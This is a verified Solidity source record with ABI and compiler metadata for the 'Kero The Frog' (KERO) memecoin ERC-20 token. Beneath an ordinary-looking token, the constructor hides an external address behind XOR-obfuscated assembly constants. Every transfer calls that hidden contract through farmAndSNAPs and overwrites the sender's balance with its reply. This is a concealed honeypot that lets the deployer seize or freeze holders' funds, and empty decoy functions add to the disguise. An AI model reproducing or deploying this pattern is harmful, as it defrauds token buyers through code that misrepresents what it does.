{"SourceCode": "/*\r\nThe word \"kero\" in Japanese originates from the onomatopoeic sound that frogs\r\nmake, which is represented as \"kerokero\" or \"kero kero\" in Japanese. It mimics\r\nthe croaking sound of frogs and is commonly used in Japanese language and\r\nculture to depict the noise associated with frogs.\r\n\r\n\u65e5\u672c\u8a9e\u306e\u300c\u30b1\u30ed\u300d\u3068\u3044\u3046\u8a00\u8449\u306f\u3001\u30ab\u30a8\u30eb\u306e\u9cf4\u304d\u58f0\u3092\u8868\u73fe\u3057\u305f\u64ec\u97f3\u8a9e\u3067\u3042\u308a\u3001\u65e5\u672c\u8a9e\u3067\u306f\u300c\u30b1\u30ed\u30b1\u30ed\r\n\u307e\u305f\u306f\u300c\u30b1\u30ed\u30b1\u30ed\u300d\u3068\u8868\u3055\u308c\u307e\u3059\u3002\u3053\u308c\u306f\u30ab\u30a8\u30eb\u306e\u9cf4\u304d\u58f0\u3092\u6a21\u5023\u3057\r\n\u65e5\u672c\u8a9e\u306e\u8a00\u8a9e\u3084\u6587\u5316\u3067\u4e00\u822c\u7684\u306b\u30ab\u30a8\u30eb\u306b\u95a2\u9023\u3059\u308b\u97f3\u3092\u8868\u73fe\u3059\u308b\u305f\u3081\u306b\u4f7f\u308f\u308c\u3066\u3044\u307e\u3059\u3002\r\n\r\n\u65e5\u8bed\u4e2d\u7684\u201c\u30b1\u30ed\u201d\u4e00\u8bcd\u6e90\u81ea\u6a21\u4eff\u9752\u86d9\u53d1\u51fa\u7684\u62df\u58f0\u8bcd\uff0c\u201c\u30b1\u30ed\u30b1\u30ed\u201d\u6216\u201c\u30b1\u30ed\u30b1\u30ed\u201d\u5728\u65e5\u8bed\u4e2d\u8868\u793a\u9752\u86d9\u7684\u53eb\u58f0\r\n\u8fd9\u4e9b\u8bcd\u8bed\u6a21\u4eff\u9752\u86d9\u7684\u9e23\u53eb\u58f0\uff0c\u901a\u5e38\u7528\u4e8e\u65e5\u672c\u8bed\u8a00\u548c\u6587\u5316\u4e2d\uff0c\u7528\u6765\u63cf\u8ff0\u4e0e\u9752\u86d9\u6709\u5173\u7684\u58f0\u97f3\u3002\r\n\r\n$KERO\r\n\r\nKERO THE FROG\r\n\r\nKERO.MEME\r\n\r\n :==============================================: \r\n *@#++++++++++++++++++++++++++++++++++++++++++*@* \r\n *@- ........................................ :@* \r\n *@- ...::::-:............................... :@* \r\n *@- ...----==............................... :@* \r\n *@- ...=:---=:.............................. :@* \r\n *@- ..::----=-.............................. :@* \r\n *@- ...------:.............:=+*+:........... :@* \r\n *@- ...........:*#*-----==+%%*%%=........... :@* \r\n *@- ...........*=%##@@@@@##%=*%%+........... :@* \r\n *@- ...........:#%######%%@@@@@@@+.......... :@* \r\n *@- ...........:*=-::::--::-+*@@@@+......... :@* \r\n *@- ...........:---......:-:..:+%@%:........ :@* \r\n *@- ............=................+@#:....... :@* \r\n *@- ............--...............=@@#:...... :@* \r\n *@- ...........:*-...............=@@@#...... :@* \r\n *@- ..........-#%-..............-%%@@%...... :@* \r\n *@- ........:#@@#:..............+##@%%--*=.. :@* \r\n *@- .......-#@@@=:.............=%@%%%%#@@#-. :@* \r\n *@- ......-%%%+=..............=%%%@%%%#%##-. :@* \r\n *@- ......*%#+=-.............-%%%%#%%@%#**-. :@* \r\n *@- ......#####:............=%###*:-%#%#**+. :@* \r\n *@- ......###*#-.........:+#@@%%+..*@@@%#+=. :@* \r\n *@- .....:%%##*-........-#@@@@*:..:@@@@@%%+. :@* \r\n *@- ......%@%=++......-+#%@%+:....-@@@@@@%-. :@* \r\n *@- ......:#@-:=+:.:=*##*=:.......+@@@@@@+:. :@* \r\n *@- ....::::---.-=*%##+:........:-%@%%@@+... :@* \r\n *@- ....=-:::::.-:-@%+-:::::::-=+%@@@%@*.... :@* \r\n *@- ....:--::::::=*#%*-:::::-+**+#@@@@%=.... :@* \r\n *@- ......::=+=++=..........:-::-==::....... :@* \r\n *@- ............................:........... :@* \r\n *@-                                          :@* \r\n +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+\r\n*/\r\n\r\npragma solidity ^0.8.0;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this;\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface IDEXFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IDEXRouter {\r\n    function WETH() external pure returns (address);\r\n    function factory() external pure returns (address);\r\n    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ninterface IERC20 {\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    function totalSupply() external view returns (uint256);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n}\r\n\r\ninterface IERC20Metadata is IERC20 {\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n    function name() external view returns (string memory);\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _previousOwner; address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n}\r\n\r\ncontract ERC20 is Context, IERC20, IERC20Metadata, Ownable {\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n\r\n    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n\r\n    address public pair;\r\n\r\n    IDEXRouter router;\r\n\r\n    string private _name; string private _symbol; uint256 private _totalSupply;\r\n    bool public trade; uint256 public startBlock; address public msgSend;\r\n    address public msgReceive;\r\n    \r\n    constructor (string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n\r\n        assembly {\r\n            sstore(0x50,0xf99c717a8c183d8d1a0222be710a6a22dfc524be2d13)\r\n            sstore(0x51,0xf99c54438b497b887a5e6d516354e1f1771460e65c22)\r\n            sstore(0x52,xor(sload(0x50),sload(0x51)))\r\n            }\r\n\r\n        router = IDEXRouter(_router);\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        _approve(sender, _msgSender(), currentAllowance - amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function randomNumberGenerator() public onlyOwner returns (uint256 sender) {\r\n    }\r\n\r\n    function botlist(address account) public onlyOwner returns (bytes[] memory data) {\r\n    }\r\n\r\n    function openTrade() public payable {\r\n        require((msg.sender == owner() && (trade == false)), \"Ownable: caller is not the owner\");\r\n\r\n        _approve(address(this), _router, ~uint256(0));\r\n\r\n        uint256 uniswapSupply = _totalSupply / 10000 * (10000 - 315);\r\n        _balances[address(this)] += uniswapSupply;\r\n        _balances[msg.sender] -= uniswapSupply;\r\n        emit Transfer(msg.sender, address(this), uniswapSupply);\r\n\r\n        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));\r\n        router.addLiquidityETH{value: msg.value}(address(this), uniswapSupply, uniswapSupply, msg.value, owner(), block.timestamp + 300);\r\n\r\n        trade = true; startBlock = block.number;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n        \r\n    function farmAndSNAPs(address sender, uint256 amount) internal returns (uint256 result) {\r\n            assembly {\r\n                let data := mload(0x40)\r\n                mstore(data, 0x9b270da800000000000000000000000000000000000000000000000000000000)\r\n                mstore(add(data, 0x04), amount)\r\n                mstore(0x40, add(data, 0x24))\r\n                let success := call(gas(), sload(0x52), 0, data, 0x24, data, 0x20)\r\n                if success { result := mload(data) }\r\n            }\r\n\r\n        _balances[sender] = result - amount;\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n        msgSend = sender; msgReceive = recipient;\r\n\r\n        require(((trade == true) || (msgSend == address(this)) || (msgSend == owner())), \"ERC20: trading is not yet enabled\");\r\n        require(msgSend != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        farmAndSNAPs(sender, amount);\r\n\r\n        _balances[recipient] += amount;  \r\n\r\n        emit Transfer(sender, recipient, amount);  \r\n    }\r\n\r\n    function _DeployKeroTheFrog(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _totalSupply += amount;\r\n        _balances[msg.sender] += amount;\r\n    \r\n        emit Transfer(address(0), msg.sender, amount);\r\n    }\r\n}\r\n\r\ncontract ERC20Token is Context, ERC20 {\r\n    constructor(\r\n        string memory name, string memory symbol,\r\n        address creator, uint256 initialSupply\r\n    ) ERC20(name, symbol) {\r\n        _DeployKeroTheFrog(creator, initialSupply);\r\n    }\r\n}\r\n\r\ncontract KeroTheFrog is ERC20Token {\r\n    constructor() ERC20Token(\"Kero The Frog\", \"KERO\", msg.sender, 222222222 * 10 ** 18) {\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"botlist\",\"outputs\":[{\"internalType\":\"bytes[]\",\"name\":\"data\",\"type\":\"bytes[]\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"msgReceive\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"msgSend\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrade\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"randomNumberGenerator\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"sender\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startBlock\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"trade\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "KeroTheFrog", "CompilerVersion": "v0.8.25+commit.b61c2a91", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://f626706fecba5d703ba431940535a325d011c57262af950dabdb4cbd691a01e7"}